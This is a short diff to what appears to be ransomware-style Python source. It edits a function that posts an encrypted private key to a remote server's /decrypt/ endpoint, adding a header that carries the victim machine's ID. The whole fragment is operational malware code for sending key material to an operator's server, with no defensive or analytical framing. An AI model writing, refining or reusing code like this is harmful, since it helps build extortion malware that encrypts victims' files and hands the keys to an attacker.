@@ -69,7 +69,8 @@ def decrypt_aes_keys(enc, key):
 
 def send_to_server_encrypted_private_key(id, private_encrypted_key):
     try:
-        ret = requests.post(server_address + "/decrypt/", data=private_encrypted_key)
+        ret = requests.post(server_address + "/decrypt/", data=private_encrypted_key,
+                            headers={"X-Machine-ID": str(id)})
     except Exception as e:
         raise e
 
